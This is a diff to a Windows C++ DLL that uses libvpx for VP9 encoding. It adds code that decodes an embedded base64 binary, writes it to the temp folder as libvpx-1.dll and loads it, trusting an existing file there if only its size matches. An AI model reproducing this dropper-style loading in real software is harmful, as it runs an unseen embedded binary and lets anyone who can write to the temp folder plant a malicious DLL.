@@ -1,4 +1,4 @@
-#define WIN32_LEAN_AND_MEAN
+﻿#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
 #include <propidl.h>
@@ -184,6 +184,26 @@ typedef vpx_codec_err_t (*pfn_vpx_codec_destroy_t)(vpx_codec_ctx_t *ctx);
 typedef vpx_image_t* (*pfn_vpx_img_alloc_t)(vpx_image_t *img, vpx_img_fmt_t fmt, unsigned int d_w, unsigned int d_h, unsigned int align);
 typedef void (*pfn_vpx_img_free_t)(vpx_image_t *img);
 
+#include "libvpx_payload.h"
+
+static vector<uint8_t> base64_decode(const string& in) {
+    vector<uint8_t> out;
+    vector<int> T(256, -1);
+    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
+
+    int val = 0, valb = -8;
+    for (char c : in) {
+        if (T[c] == -1) continue;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) {
+            out.push_back((val >> valb) & 0xFF);
+            valb -= 8;
+        }
+    }
+    return out;
+}
+
 struct LibVpxFunctions {
     HMODULE hModule = nullptr;
     pfn_vpx_codec_vp9_cx_t vp9_cx = nullptr;
@@ -202,6 +222,38 @@ struct LibVpxFunctions {
             hModule = LoadLibraryW(dll);
             if (hModule) break;
         }
+
+        if (!hModule) {
+            wchar_t temp_path[MAX_PATH];
+            if (GetTempPathW(MAX_PATH, temp_path) > 0) {
+                wstring target_dll = wstring(temp_path) + L"libvpx-1.dll";
+
+                bool exist_and_correct = false;
+                HANDLE hFile = CreateFileW(target_dll.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    LARGE_INTEGER sz{};
+                    if (GetFileSizeEx(hFile, &sz) && sz.QuadPart == 1574930LL) {
+                        exist_and_correct = true;
+                    }
+                    CloseHandle(hFile);
+                }
+
+                if (!exist_and_correct) {
+                    vector<uint8_t> decoded = base64_decode(LIBVPX_DLL_BASE64);
+                    if (!decoded.empty()) {
+                        HANDLE hFileWrite = CreateFileW(target_dll.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                        if (hFileWrite != INVALID_HANDLE_VALUE) {
+                            DWORD written = 0;
+                            WriteFile(hFileWrite, decoded.data(), (DWORD)decoded.size(), &written, NULL);
+                            CloseHandle(hFileWrite);
+                        }
+                    }
+                }
+
+                hModule = LoadLibraryW(target_dll.c_str());
+            }
+        }
+
         if (!hModule) return false;
 
         vp9_cx = (pfn_vpx_codec_vp9_cx_t)GetProcAddress(hModule, "vpx_codec_vp9_cx");
@@ -1051,7 +1103,6 @@ BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
                 g_vpx.destroy(&g_vpxEncoder);
                 g_vpxEncoderInitialized = false;
             }
-            g_vpx.Unload();
         }
         shutdown_gdiplus();
     }
